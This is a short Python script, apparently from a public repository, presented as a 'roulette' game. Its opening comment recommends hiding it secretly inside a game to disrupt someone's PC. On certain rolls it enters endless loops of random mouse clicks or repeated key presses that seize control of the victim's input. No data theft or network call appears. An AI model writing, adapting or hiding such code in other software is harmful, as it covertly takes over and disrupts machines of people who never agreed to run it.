#If used for commercial purposes, (e.g: Youtube video, etc) please credit this repository.
#This is a good program to put secretly into a game if you want to temporarily fuck up someone's pc

import pyautogui
import time
import random
import pynput

from pynput.keyboard import Key, Controller

key = Controller()

def roulette():
    global random
    global pyautogui
    global pynput
    numb = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9, 0])

    if numb == 3:
        while True:
            ran1 = random.choice([0, 540, 1920, 740])
            ran2 = random.choice([0, 234, 543, 1080])
            print('Good luck with the mouse pointer.')
            pyautogui.click(ran1, ran2)

    elif numb == 7:
        while True:
            print('You pc is going to freeze soon.')
            key.press('`')
            key.release('`')

    else:
        print('You are safe for now...')

while True:
    roulette()
    input('Press enter to roll again...')
